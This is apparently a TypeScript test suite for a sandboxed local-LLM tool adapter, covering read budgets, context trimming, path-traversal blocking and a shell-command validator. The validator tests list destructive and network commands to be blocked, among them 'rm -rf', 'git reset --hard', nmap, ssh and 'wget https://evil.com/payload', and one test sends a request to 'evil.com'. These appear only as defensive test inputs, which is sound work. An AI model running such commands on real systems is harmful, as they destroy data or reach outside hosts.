import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { BoundedLocalAdapter, setFetchForTests, validateRuntimeShellCommand } from './bounded-local-adapter.js';

function makeFetchMock(responses: Array<Record<string, unknown>>): {
  fetch: typeof globalThis.fetch;
  calls: Array<{ url: string; body: Record<string, unknown> }>;
} {
  const calls: Array<{ url: string; body: Record<string, unknown> }> = [];
  let callIndex = 0;
  const fetch = async (input: string | URL | Request, init?: RequestInit): Promise<Response> => {
    const url = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
    const body = JSON.parse(init?.body as string) as Record<string, unknown>;
    calls.push({ url, body });
    const responseBody = responses[callIndex] ?? responses[responses.length - 1]!;
    callIndex++;
    return new Response(JSON.stringify(responseBody), {
      status: 200,
      headers: { 'Content-Type': 'application/json' },
    });
  };
  return { fetch: fetch as typeof globalThis.fetch, calls };
}

function chatResponse(content: string, toolCalls?: Array<{ name: string; args: Record<string, string> }>): Record<string, unknown> {
  const message: Record<string, unknown> = { role: 'assistant' };
  if (toolCalls?.length) {
    message.tool_calls = toolCalls.map((tc, i) => ({
      id: `call_${i}`,
      type: 'function',
      function: { name: tc.name, arguments: JSON.stringify(tc.args) },
    }));
  }
  if (content) {
    message.content = content;
  }
  return {
    choices: [{ message, finish_reason: toolCalls?.length ? 'tool_calls' : 'stop' }],
    usage: { prompt_tokens: 100, completion_tokens: 50 },
  };
}

test('BoundedLocalAdapter returns a simple response without tool calls', async () => {
  const { fetch, calls } = makeFetchMock([chatResponse('{"answer":"hello"}')]);
  setFetchForTests(fetch);

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    baseUrl: 'http://localhost:9999/v1',
  });

  const result = await adapter.invoke({ prompt: 'Say hello.' });

  assert.equal(result.provider, 'bounded_local');
  assert.equal(result.model, 'test-model');
  assert.equal(result.content, '{"answer":"hello"}');
  assert.equal(result.usage.costUsd, 0);
  assert.equal(result.usage.inputTokens, 100);
  assert.equal(result.usage.outputTokens, 50);
  assert.equal(calls.length, 1);
  assert.match(calls[0]!.url, /localhost:9999/);
});

test('BoundedLocalAdapter executes tool calls and feeds results back', async () => {
  const dir = await mkdtemp(resolve(tmpdir(), 'bounded-tools-'));
  await writeFile(join(dir, 'hello.txt'), 'file contents here');

  const { fetch, calls } = makeFetchMock([
    chatResponse('', [{ name: 'list_dir', args: { path: '.' } }]),
    chatResponse('{"found":"hello.txt"}'),
  ]);
  setFetchForTests(fetch);

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    baseUrl: 'http://localhost:9999/v1',
    workingDirectory: dir,
  });

  const result = await adapter.invoke({ prompt: 'List files.' });

  assert.equal(calls.length, 2);
  assert.equal(result.content, '{"found":"hello.txt"}');
  // First call should have tools
  assert.ok(calls[0]!.body.tools);
});

test('BoundedLocalAdapter read_file returns file content correctly', async () => {
  const dir = await mkdtemp(resolve(tmpdir(), 'bounded-read-'));
  await writeFile(join(dir, 'data.ts'), 'export const x = 42;');

  const { fetch } = makeFetchMock([
    chatResponse('', [{ name: 'read_file', args: { path: 'data.ts' } }]),
    chatResponse('The value is 42'),
  ]);
  setFetchForTests(fetch);

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    baseUrl: 'http://localhost:9999/v1',
    workingDirectory: dir,
  });

  const result = await adapter.invoke({ prompt: 'Read data.ts' });
  assert.equal(result.content, 'The value is 42');
});

test('BoundedLocalAdapter exhausts read budget and removes tools from payload', async () => {
  const dir = await mkdtemp(resolve(tmpdir(), 'bounded-budget-'));
  await writeFile(join(dir, 'a.txt'), 'aaa');
  await writeFile(join(dir, 'b.txt'), 'bbb');
  await writeFile(join(dir, 'c.txt'), 'ccc');

  const { fetch, calls } = makeFetchMock([
    chatResponse('', [{ name: 'read_file', args: { path: 'a.txt' } }]),
    chatResponse('', [{ name: 'read_file', args: { path: 'b.txt' } }]),
    // Budget exhausted after 2 reads — tools should be removed
    chatResponse('final answer after budget'),
  ]);
  setFetchForTests(fetch);

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    baseUrl: 'http://localhost:9999/v1',
    workingDirectory: dir,
    boundedConfig: { readBudget: 2, maxTurns: 10 },
  });

  const result = await adapter.invoke({ prompt: 'Read all files.' });

  assert.equal(result.content, 'final answer after budget');
  // First two calls should have tools, third should not
  assert.ok(calls[0]!.body.tools, 'first call should have tools');
  assert.ok(calls[1]!.body.tools, 'second call should have tools');
  assert.equal(calls[2]!.body.tools, undefined, 'third call should NOT have tools (budget exhausted)');
});

test('BoundedLocalAdapter max turns cap returns available content', async () => {
  // Create a response that always asks for more tool calls
  const { fetch } = makeFetchMock([
    chatResponse('', [{ name: 'list_dir', args: { path: '.' } }]),
    chatResponse('', [{ name: 'list_dir', args: { path: '.' } }]),
    chatResponse('{"partial":"answer from turn limit"}'),
  ]);
  setFetchForTests(fetch);

  const dir = await mkdtemp(resolve(tmpdir(), 'bounded-maxturns-'));

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    baseUrl: 'http://localhost:9999/v1',
    workingDirectory: dir,
    boundedConfig: { maxTurns: 3 },
  });

  const result = await adapter.invoke({ prompt: 'Keep going.' });
  assert.equal(result.content, '{"partial":"answer from turn limit"}');
});

test('BoundedLocalAdapter blocks path traversal', async () => {
  const dir = await mkdtemp(resolve(tmpdir(), 'bounded-traversal-'));

  const { fetch, calls } = makeFetchMock([
    chatResponse('', [{ name: 'read_file', args: { path: '../../etc/passwd' } }]),
    chatResponse('{"error":"blocked"}'),
  ]);
  setFetchForTests(fetch);

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    baseUrl: 'http://localhost:9999/v1',
    workingDirectory: dir,
  });

  const result = await adapter.invoke({ prompt: 'Read /etc/passwd.' });

  assert.equal(calls.length, 2);
  assert.equal(result.content, '{"error":"blocked"}');
  // The tool result in the second call's messages should contain an error
  const secondBody = calls[1]!.body;
  const messages = secondBody.messages as Array<{ role: string; content?: string }>;
  const toolResult = messages.find((m) => m.role === 'tool');
  assert.ok(toolResult);
  assert.match(toolResult!.content!, /outside sandbox/i);
});

test('BoundedLocalAdapter read cache prevents double budget charge', async () => {
  const dir = await mkdtemp(resolve(tmpdir(), 'bounded-cache-'));
  await writeFile(join(dir, 'same.txt'), 'cached content');

  // With readBudget: 2, reading the same file twice should only cost 1 unit.
  // Without caching, reading same.txt twice would cost 2 units and exhaust
  // the budget. With caching, the second read is free and the budget stays at 1.
  const { fetch, calls } = makeFetchMock([
    chatResponse('', [{ name: 'read_file', args: { path: 'same.txt' } }]),
    chatResponse('', [{ name: 'read_file', args: { path: 'same.txt' } }]),
    chatResponse('done'),
  ]);
  setFetchForTests(fetch);

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    baseUrl: 'http://localhost:9999/v1',
    workingDirectory: dir,
    boundedConfig: { readBudget: 2, maxTurns: 10 },
  });

  const result = await adapter.invoke({ prompt: 'Read same.txt twice.' });

  assert.equal(result.content, 'done');
  // All three calls should have tools because the cache keeps readCount at 1,
  // well under the budget of 2. Without caching, readCount would be 2 after
  // the second read and tools would be removed for the third call.
  assert.ok(calls[0]!.body.tools, 'first call has tools');
  assert.ok(calls[1]!.body.tools, 'second call has tools (cached read is free)');
  assert.ok(calls[2]!.body.tools, 'third call still has tools (budget not exhausted thanks to cache)');
});

test('BoundedLocalAdapter recovers from context overflow by disabling tools', async () => {
  const dir = await mkdtemp(resolve(tmpdir(), 'bounded-overflow-'));
  await writeFile(join(dir, 'big.txt'), 'x'.repeat(5000));

  let callIndex = 0;
  const calls: Array<{ body: Record<string, unknown> }> = [];
  const fetch = async (_input: string | URL | Request, init?: RequestInit): Promise<Response> => {
    const body = JSON.parse(init?.body as string) as Record<string, unknown>;
    calls.push({ body });
    callIndex++;
    if (callIndex === 1) {
      return new Response(JSON.stringify(chatResponse('', [{ name: 'read_file', args: { path: 'big.txt' } }])), {
        status: 200, headers: { 'Content-Type': 'application/json' },
      });
    }
    if (callIndex === 2) {
      return new Response(JSON.stringify({ error: { code: 500, message: 'Context size has been exceeded.', type: 'server_error' } }), {
        status: 500, headers: { 'Content-Type': 'application/json' },
      });
    }
    return new Response(JSON.stringify(chatResponse('{"recovered":"yes"}')), {
      status: 200, headers: { 'Content-Type': 'application/json' },
    });
  };
  setFetchForTests(fetch as typeof globalThis.fetch);

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    baseUrl: 'http://localhost:9999/v1',
    workingDirectory: dir,
    boundedConfig: { maxTurns: 10, maxContextChars: 500 },
  });

  const result = await adapter.invoke({ prompt: 'Read big.txt.' });

  assert.equal(result.content, '{"recovered":"yes"}');
  assert.ok(calls[0]!.body.tools, 'first call has tools');
  assert.ok(calls[1]!.body.tools, 'second call has tools (before overflow)');
  assert.equal(calls[2]!.body.tools, undefined, 'third call should NOT have tools (overflow recovery)');
});

test('BoundedLocalAdapter proactively trims old tool results when approaching context limit', async () => {
  const dir = await mkdtemp(resolve(tmpdir(), 'bounded-trim-'));
  await writeFile(join(dir, 'a.txt'), 'A'.repeat(3000));
  await writeFile(join(dir, 'b.txt'), 'B'.repeat(3000));

  const { fetch, calls } = makeFetchMock([
    chatResponse('', [{ name: 'read_file', args: { path: 'a.txt' } }]),
    chatResponse('', [{ name: 'read_file', args: { path: 'b.txt' } }]),
    chatResponse('{"summary":"done"}'),
  ]);
  setFetchForTests(fetch);

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    baseUrl: 'http://localhost:9999/v1',
    workingDirectory: dir,
    boundedConfig: { maxTurns: 10, readBudget: 10, maxContextChars: 4000 },
  });

  const result = await adapter.invoke({ prompt: 'Read both.' });

  assert.equal(result.content, '{"summary":"done"}');
  // The third call's messages should have trimmed the first tool result
  const thirdMessages = calls[2]!.body.messages as Array<{ role: string; content?: string }>;
  const toolResults = thirdMessages.filter((m) => m.role === 'tool');
  const trimmedResult = toolResults.find((m) => m.content?.includes('[truncated'));
  assert.ok(trimmedResult, 'at least one old tool result should be trimmed');
});

test('BoundedLocalAdapter uses a fresh no-tools synthesis call after XML tool-call drift', async () => {
  const dir = await mkdtemp(resolve(tmpdir(), 'bounded-synthesis-reset-'));
  await writeFile(join(dir, 'auth.py'), 'def user_api_key_auth():\n    return None\n');

  const { fetch, calls } = makeFetchMock([
    chatResponse('', [{ name: 'read_file', args: { path: 'auth.py' } }]),
    chatResponse('Let me read the key auth file more carefully...\n<tool_call><function=read_file><parameter=path>auth.py</parameter></function></tool_call>'),
    chatResponse('{"newSignals":[],"probeRequests":[],"newChainHypotheses":[],"markDormant":[],"reactivations":[],"reasoning":"Fresh synthesis completed."}'),
  ]);
  setFetchForTests(fetch);

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    baseUrl: 'http://localhost:9999/v1',
    workingDirectory: dir,
    boundedConfig: { maxTurns: 4, synthesisMaxTokens: 512 },
  });

  const result = await adapter.invoke({
    systemPrompt: 'Return planner JSON.',
    prompt: 'Analyze auth.py and return planner output.',
  });

  assert.equal(calls.length, 3);
  assert.match(result.content, /Fresh synthesis completed/);

  const synthesisBody = calls[2]!.body;
  const synthesisMessages = synthesisBody.messages as Array<{ role: string; content?: string }>;
  assert.equal(synthesisBody.tools, undefined, 'fresh synthesis call should not expose tools');
  assert.equal(synthesisBody.max_tokens, 512, 'fresh synthesis call should honor the bounded synthesis token cap');
  assert.equal(synthesisMessages.length, 2, 'fresh synthesis call should reset to a clean conversation');
  assert.equal(synthesisMessages[0]?.role, 'system');
  assert.equal(synthesisMessages[1]?.role, 'user');
  assert.match(synthesisMessages[1]?.content ?? '', /Evidence collected during the tool-use phase:/);
});

test('BoundedLocalAdapter caps tool-enabled turns separately from final synthesis turns', async () => {
  const dir = await mkdtemp(resolve(tmpdir(), 'bounded-tool-max-tokens-'));
  await writeFile(join(dir, 'auth.py'), 'def auth():\n    return None\n');

  const { fetch, calls } = makeFetchMock([
    chatResponse('', [{ name: 'read_file', args: { path: 'auth.py' } }]),
    chatResponse('{"newSignals":[],"probeRequests":[],"newChainHypotheses":[],"markDormant":[],"reactivations":[],"reasoning":"done"}'),
  ]);
  setFetchForTests(fetch);

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    baseUrl: 'http://localhost:9999/v1',
    workingDirectory: dir,
    boundedConfig: { maxTurns: 4, readBudget: 1, toolMaxTokens: 256, synthesisMaxTokens: 512 },
  });

  const result = await adapter.invoke({
    prompt: 'Analyze auth.py.',
    maxTokens: 8192,
  });

  assert.match(result.content, /"reasoning":"done"/);
  assert.equal(calls[0]!.body.max_tokens, 256, 'tool-enabled turn should use the bounded tool token cap');
  assert.equal(calls[1]!.body.max_tokens, 512, 'final no-tools turn should use the bounded synthesis token cap');
  assert.ok(calls[0]!.body.tools, 'tool-enabled turn should expose tools');
  assert.equal(calls[1]!.body.tools, undefined, 'final no-tools turn should not expose tools after budget exhaustion');
});

// ---------------------------------------------------------------------------
// Runtime shell policy validation (unit tests — no adapter needed)
// ---------------------------------------------------------------------------

test('validateRuntimeShellCommand blocks recursive Security Lab invocation', () => {
  assert.ok(validateRuntimeShellCommand('npm run investigate --target foo', 'runtime'));
  assert.ok(validateRuntimeShellCommand('npm run verify --report bar', 'runtime'));
  assert.ok(validateRuntimeShellCommand('tsx src/autonomous/verify-cli.ts', 'runtime'));
});

test('validateRuntimeShellCommand blocks destructive filesystem commands', () => {
  assert.ok(validateRuntimeShellCommand('rm -rf /tmp/test', 'runtime'));
  assert.ok(validateRuntimeShellCommand('mv foo bar', 'runtime'));
  assert.ok(validateRuntimeShellCommand('cp foo bar', 'runtime'));
  assert.ok(validateRuntimeShellCommand('touch newfile', 'runtime'));
  assert.ok(validateRuntimeShellCommand('chmod 777 file', 'runtime'));
  assert.ok(validateRuntimeShellCommand('tee output.txt', 'runtime'));
});

test('validateRuntimeShellCommand blocks shell write redirection', () => {
  assert.ok(validateRuntimeShellCommand('echo foo > bar.txt', 'runtime'));
  assert.ok(validateRuntimeShellCommand('echo foo >> bar.txt', 'runtime'));
  assert.ok(validateRuntimeShellCommand('cmd 2> error.log', 'runtime'));
});

test('validateRuntimeShellCommand blocks destructive git commands', () => {
  assert.ok(validateRuntimeShellCommand('git checkout main', 'runtime'));
  assert.ok(validateRuntimeShellCommand('git reset --hard HEAD', 'runtime'));
  assert.ok(validateRuntimeShellCommand('git clean -fd', 'runtime'));
  assert.ok(validateRuntimeShellCommand('git push origin main', 'runtime'));
  assert.ok(validateRuntimeShellCommand('git commit -m "test"', 'runtime'));
});

test('validateRuntimeShellCommand allows read-only git commands', () => {
  assert.equal(validateRuntimeShellCommand('git status', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('git diff', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('git log --oneline', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('git grep "pattern"', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('git show HEAD', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('git blame file.py', 'runtime'), null);
});

test('validateRuntimeShellCommand blocks host package installs', () => {
  assert.ok(validateRuntimeShellCommand('npm install express', 'runtime'));
  assert.ok(validateRuntimeShellCommand('pip install requests', 'runtime'));
  assert.ok(validateRuntimeShellCommand('pip3 install flask', 'runtime'));
  assert.ok(validateRuntimeShellCommand('yarn add lodash', 'runtime'));
  assert.ok(validateRuntimeShellCommand('brew install wget', 'runtime'));
  assert.ok(validateRuntimeShellCommand('apt-get install curl', 'runtime'));
  assert.ok(validateRuntimeShellCommand('cargo install ripgrep', 'runtime'));
  assert.ok(validateRuntimeShellCommand('go get github.com/foo/bar', 'runtime'));
});

test('validateRuntimeShellCommand allows Docker commands in runtime mode', () => {
  assert.equal(validateRuntimeShellCommand('docker info', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('docker ps', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('docker compose up -d', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('docker compose down', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('docker logs container_name', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('docker exec container_name ls', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('docker compose build', 'runtime'), null);
});

test('validateRuntimeShellCommand blocks Docker in source mode', () => {
  assert.ok(validateRuntimeShellCommand('docker info', 'source'));
  assert.ok(validateRuntimeShellCommand('docker compose up', 'source'));
});

test('validateRuntimeShellCommand blocks external network tools', () => {
  assert.ok(validateRuntimeShellCommand('nmap -sV target.com', 'runtime'));
  assert.ok(validateRuntimeShellCommand('ssh user@host', 'runtime'));
  assert.ok(validateRuntimeShellCommand('scp file user@host:/', 'runtime'));
});

test('validateRuntimeShellCommand allows loopback curl but blocks external curl', () => {
  assert.equal(validateRuntimeShellCommand('curl http://localhost:4000/health', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('curl http://127.0.0.1:8080/api', 'runtime'), null);
  assert.ok(validateRuntimeShellCommand('curl https://example.com/api', 'runtime'));
  assert.ok(validateRuntimeShellCommand('wget https://evil.com/payload', 'runtime'));
});

test('validateRuntimeShellCommand blocks broad find / searches', () => {
  assert.ok(validateRuntimeShellCommand('find / -name "*.py"', 'runtime'));
  assert.equal(validateRuntimeShellCommand('find /tmp -name "*.log"', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('find . -name "*.py"', 'runtime'), null);
});

test('validateRuntimeShellCommand allows read-only inspection', () => {
  assert.equal(validateRuntimeShellCommand('pwd', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('ls -la', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('cat file.py', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('head -50 config.yaml', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('grep -r "pattern" .', 'runtime'), null);
  assert.equal(validateRuntimeShellCommand('find . -name "*.py" -maxdepth 3', 'runtime'), null);
});

// ---------------------------------------------------------------------------
// Runtime tools in adapter — integration tests
// ---------------------------------------------------------------------------

test('runtimeTools: false does not include runtime schemas in API payload', async () => {
  const { fetch, calls } = makeFetchMock([chatResponse('{"result":"done"}')]);
  setFetchForTests(fetch);

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    boundedConfig: { runtimeTools: false },
  });

  await adapter.invoke({ prompt: 'test' });

  const tools = calls[0]!.body.tools as Array<{ function: { name: string } }>;
  assert.ok(tools);
  const names = tools.map((t) => t.function.name);
  assert.ok(names.includes('read_file'));
  assert.ok(names.includes('list_dir'));
  assert.ok(names.includes('grep'));
  assert.ok(!names.includes('shell_exec'));
  assert.ok(!names.includes('http_request'));
});

test('runtimeTools: true includes shell_exec and http_request in API payload', async () => {
  const { fetch, calls } = makeFetchMock([chatResponse('{"result":"done"}')]);
  setFetchForTests(fetch);

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    boundedConfig: { runtimeTools: true },
  });

  await adapter.invoke({ prompt: 'test' });

  const tools = calls[0]!.body.tools as Array<{ function: { name: string } }>;
  const names = tools.map((t) => t.function.name);
  assert.ok(names.includes('shell_exec'));
  assert.ok(names.includes('http_request'));
});

test('shell_exec dispatches and returns output', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'bounded-shell-'));
  await writeFile(join(dir, 'test.txt'), 'hello world');

  const { fetch } = makeFetchMock([
    chatResponse('', [{ name: 'shell_exec', args: { command: 'cat test.txt' } }]),
    chatResponse('{"result":"done"}'),
  ]);
  setFetchForTests(fetch);

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    workingDirectory: dir,
    boundedConfig: { runtimeTools: true, shellPolicy: 'runtime' },
  });

  const result = await adapter.invoke({ prompt: 'test', workingDirectory: dir });
  assert.match(result.content, /done/);
});

test('http_request rejects non-localhost URLs with error message', async () => {
  const { fetch } = makeFetchMock([
    chatResponse('', [{ name: 'http_request', args: { url: 'https://evil.com/api' } }]),
    chatResponse('{"result":"done"}'),
  ]);
  setFetchForTests(fetch);

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    boundedConfig: { runtimeTools: true },
  });

  const result = await adapter.invoke({ prompt: 'test' });
  assert.match(result.content, /done/);
});

test('shellBudget exhaustion removes shell_exec but keeps other tools', async () => {
  const { fetch, calls } = makeFetchMock([
    chatResponse('', [{ name: 'shell_exec', args: { command: 'echo 1' } }]),
    chatResponse('', [{ name: 'shell_exec', args: { command: 'echo 2' } }]),
    chatResponse('{"result":"done"}'),
  ]);
  setFetchForTests(fetch);

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    boundedConfig: { runtimeTools: true, shellBudget: 1, shellPolicy: 'runtime' },
  });

  await adapter.invoke({ prompt: 'test' });

  const firstTools = calls[0]!.body.tools as Array<{ function: { name: string } }>;
  const firstNames = firstTools.map((t) => t.function.name);
  assert.ok(firstNames.includes('shell_exec'), 'first call should include shell_exec');

  const secondTools = calls[1]!.body.tools as Array<{ function: { name: string } }>;
  if (secondTools) {
    const secondNames = secondTools.map((t) => t.function.name);
    assert.ok(!secondNames.includes('shell_exec'), 'second call should not include shell_exec after budget exhaustion');
    assert.ok(secondNames.includes('http_request'), 'second call should still include http_request');
    assert.ok(secondNames.includes('grep'), 'second call should still include grep');
  }
});

test('httpBudget exhaustion removes http_request but keeps other tools', async () => {
  const { fetch, calls } = makeFetchMock([
    chatResponse('', [{ name: 'http_request', args: { url: 'http://localhost:4000/health' } }]),
    chatResponse('', [{ name: 'http_request', args: { url: 'http://localhost:4000/api' } }]),
    chatResponse('{"result":"done"}'),
  ]);
  setFetchForTests(fetch);

  const adapter = new BoundedLocalAdapter({
    provider: 'bounded_local',
    model: 'test-model',
    boundedConfig: { runtimeTools: true, httpBudget: 1, shellPolicy: 'runtime' },
  });

  await adapter.invoke({ prompt: 'test' });

  const secondTools = calls[1]!.body.tools as Array<{ function: { name: string } }>;
  if (secondTools) {
    const secondNames = secondTools.map((t) => t.function.name);
    assert.ok(!secondNames.includes('http_request'), 'second call should not include http_request');
    assert.ok(secondNames.includes('shell_exec'), 'second call should still include shell_exec');
  }
});
